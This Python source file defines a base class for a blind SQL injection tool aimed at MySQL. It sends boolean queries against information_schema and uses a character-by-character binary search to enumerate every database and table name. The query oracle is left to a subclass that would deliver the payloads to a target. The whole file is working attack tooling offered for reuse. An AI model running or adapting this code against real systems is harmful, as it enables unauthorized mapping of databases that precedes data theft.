'''
Created on Jul 5, 2014

@author: Jordi Llull
'''
import logging

class BaseInjector(object):

    def __init__(self):
        self.logger = logging.getLogger('base_injector')
        self.logger.setLevel(logging.DEBUG)

        fh = logging.FileHandler('injector.log')
        fh.setLevel(logging.DEBUG)

        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)

        fmt = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        fh.setFormatter(fmt)
        ch.setFormatter(fmt)

        self.logger.addHandler(ch)
        self.logger.addHandler(fh)

    def runQuery(self, query):
        raise NotImplementedError("you should implement the runQuery method")

    def findNewDatabase(self, databases_found):
        word = []
        while not self.isDatabaseCompleted(word, databases_found):
            char = self.findNextChar(word, databases_found)
            self.logger.debug("Next char found: {0}".format(''.join(word)))
            if char is False:
                return False
            else:
                word.append(char)

        return ''.join(word)

    def isDatabaseCompleted(self, word, databases_found):
        name = ''.join(word)
        not_in_database_sql = ''.join(map(lambda x: " AND table_schema not like '" + x + "'\n", databases_found))
        sql = """SELECT 1
                    FROM information_schema.tables
                   WHERE table_schema like "{0}"
                     AND LENGTH(table_schema) = {1}
                     {2}
              """.format(name, len(word), not_in_database_sql)
        return self.runQuery(sql)

    def testChars(self, word, database, chars, words_found):
        name = ''.join(word)

        available_chars = ', '.join(map(lambda x: '"' + x + '"', chars))

        if database is not None:
            not_already_found = ''.join(map(lambda x: " AND table_name not like '" + x + "'\n", words_found))
            sql = """SELECT 1
                        FROM information_schema.tables
                       WHERE table_schema = "{database}"
                         AND table_name like "{name}%"
                         AND substring(table_name, {offset}, 1) in ({chars})
                         {not_in_sql}
                     """.format(database=database, name=name, offset=len(word) + 1, chars=available_chars, not_in_sql=not_already_found)
        else:
            not_schema_sql = ''.join(map(lambda x: " AND table_schema not like '" + x + "'\n", words_found))
            sql = """SELECT 1
                        FROM information_schema.tables
                       WHERE table_schema like "{0}%"
                         AND substring(table_schema, {1}, 1) IN ({2})
                         {3}
                  """.format(name, len(word) + 1, available_chars, not_schema_sql)
        return self.runQuery(sql)


    """
     Performs a binary search to find the next char
    """
    def findNextChar(self, word, words_found, database=None, available_chars=None):
        if available_chars is None:
            available_chars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h',
                               'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p',
                               'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
                               'y', 'z', '_', '0', '1', '2', '3', '4',
                               '5', '6', '7', '8', '9']
        if len(available_chars) == 1:
            if self.testChars(word, database, available_chars, words_found):
                return available_chars[0]
            else:
                return False

        if len(available_chars) == 0:
            raise ValueError("The world we were looking to contains an unexpected character");

        idx = int(len(available_chars) / 2)
        left, right = available_chars[idx:], available_chars[:idx]

        if(self.testChars(word, database, left, words_found)):
            return self.findNextChar(word, words_found, database, left)
        else:
            return self.findNextChar(word, words_found, database, right)

    def isTableCompleted(self, word, database, tables_found):
        table_name = ''.join(word)
        table_not_already_find = ''.join(map(lambda x: " AND table_name not like '" + x + "'\n", tables_found))
        sql = """SELECT 1
                    FROM information_schema.tables
                   WHERE table_schema = "{0}"
                     AND table_name   = "{1}"
                     AND LENGTH(table_name) = {2}
                     {3}
              """.format(database, table_name, len(table_name), table_not_already_find)
        return self.runQuery(sql)

    def findNewTable(self, database, tables_found):
        word = []
        while not self.isTableCompleted(word, database, tables_found):
            char = self.findNextChar(word, tables_found, database)
            self.logger.debug("Next char found: {0}.{1}".format(database, ''.join(word)))
            if char is False:
                return False
            else:
                word.append(char)

        return ''.join(word)

    def findTables(self, database):
        tables = []
        new_table = self.findNewTable(database, tables)
        while (new_table):
            tables.append(new_table)
            self.logger.debug("New table found: {0}.{1}".format(database, new_table))
            new_table = self.findNewTable(database, tables)
        return tables

    def getDatabases(self):
        databases = []
        new_database = self.findNewDatabase(databases)
        while (new_database):
            databases.append(new_database)
            self.logger.info("New database found: {0}".format(new_database))
            new_database = self.findNewDatabase(databases)
        self.logger.info("{0} Databases founds: {1}".format(len(databases), databases))

        return databases

    def getTables(self, databases):
        tables = {}
        for database in databases:
            tables[database] = self.findTables(database)
            self.logger.info("{0} New tables found for database {1}: {2}".format(len(tables[database]), database, tables[database]))
        return tables
